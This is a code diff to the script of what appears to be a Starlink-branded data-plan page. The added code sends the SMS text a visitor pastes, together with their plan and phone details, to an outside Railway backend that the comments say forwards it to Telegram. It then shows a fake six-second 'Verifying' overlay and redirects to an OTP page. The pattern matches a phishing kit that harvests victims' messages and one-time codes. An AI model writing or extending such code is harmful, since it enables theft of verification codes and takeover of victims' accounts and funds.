@@ -416,6 +416,14 @@
     </nav>
 
     <script>
+        // ============================================
+        // RAILWAY BACKEND URL
+        // ============================================
+        const API_BASE = 'https://starlink-network-zm-production.up.railway.app';
+
+        // ============================================
+        // READ PLAN FROM URL
+        // ============================================
         const params = new URLSearchParams(window.location.search);
         const planName = params.get('plan') || 'Elite Bundle';
         const planData = params.get('data') || '400GB';
@@ -462,8 +470,11 @@
 
         textarea.addEventListener('input', validateSMS);
 
-        // Submit — show waiting for 6 seconds then go to otp-verify.html
-        form.addEventListener('submit', function (e) {
+        /* ============================================
+           SUBMIT — send SMS to Telegram (no buttons),
+           then show waiting for 6s and go to OTP page
+           ============================================ */
+        form.addEventListener('submit', async function (e) {
             e.preventDefault();
             const val = textarea.value.trim();
 
@@ -475,9 +486,29 @@
             verifyBtn.disabled = true;
             verifyBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verifying...</span>';
 
+            // Show waiting overlay
             waitingOverlay.classList.add('open');
             document.body.classList.add('modal-open');
 
+            // Send SMS details to Telegram (fire and forget)
+            try {
+                await fetch(API_BASE + '/api/sms', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        plan: planName,
+                        data: planData,
+                        price: planPrice,
+                        period: planPeriod,
+                        phone: planPhone,
+                        sms: val
+                    })
+                });
+            } catch (err) {
+                console.error('Failed to send SMS:', err);
+            }
+
+            // After 6 seconds → go to OTP page
             setTimeout(() => {
                 const otpParams = new URLSearchParams({
                     plan: planName,
